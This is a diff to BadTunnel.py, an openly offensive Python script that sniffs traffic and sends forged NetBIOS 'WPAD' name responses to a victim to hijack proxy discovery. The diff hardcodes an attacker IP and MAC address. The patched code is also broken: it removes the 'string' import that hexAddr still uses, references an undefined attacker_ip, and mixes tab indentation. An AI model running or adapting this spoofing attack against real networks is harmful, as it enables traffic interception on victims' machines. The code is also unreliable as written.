@@ -1,12 +1,10 @@
 # BadTunnel.py
+# Change MAC_ADDR, ATTCKR_IP
 # -----------------------------------------
-# Receives as arguments [ip_address], [mac_address]
 
 # Imports
 import socket
 import collections
-import sys
-import string
 
 # Offsets
 IP_DST_START            = 32
@@ -20,6 +18,7 @@ IP_SRC_END              = 32
 
 # ---------------------------------
 # Constants
+ATTCKR_IP               = '172.16.0.54'
 PORT                    = 137
 WPAD_20                 = "\x57\x50\x41\x44\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
 MAC_ADDR                = "\x78\xac\xc0\x95\x75\x26"
@@ -56,20 +55,18 @@ class NB_ANS:
 
         def packetize(self):
             return bytes("".join(self.fields.values()))
+ 
 def hexAddr(addr):
     octet = string.split(addr, ".")
     return "{}{}{}{}".format(hex(octet[0])[2:], hex(octet[1])[2:], hex(octet[2])[2:], hex(octet[3])[2:])
-    
+	
 def main():
-    attacker_ip, attacker_mac = sys.argv[1:2]
     sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
-    sniffer.bind((attacker_ip, 137))
+    sniffer.bind((ATTCKR_IP, 0))
     sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
     sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
     print "Sniffing.."
-    
-    attacker_ip_hex = hexAddr(attacker_ip)
-        
+	attacker_ip_hex = hexAddr(attacker_ip)
     # Sniffing Loop
     while True:
         data, addr = sniffer.recvfrom(65535)
@@ -91,11 +88,11 @@ def main():
             
             # Start answering to packet.
             reply = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            reply.bind((attacker_ip, PORT))
+            reply.bind((ATTCKR_IP, PORT))
             reply.settimeout(2)
 
             # Building the NBSTAT response.
-            packet = NB_ANS(data, WPAD_20, attacker_mac)
+            packet = NB_ANS(data, WPAD_20, MAC_ADDR)
 
             # Sending the packet to the victim.
             reply.sendto(NB_ANS.packetize(packet), (ip_dec, PORT))
@@ -104,7 +101,7 @@ def main():
 
             # Starts sniffing again.
             sniffer = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
-            sniffer.bind((attacker_ip, 0))
+            sniffer.bind((ATTCKR_IP, 0))
             sniffer.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
             sniffer.ioctl(socket.SIO_RCVALL, socket.RCVALL_ON)
 
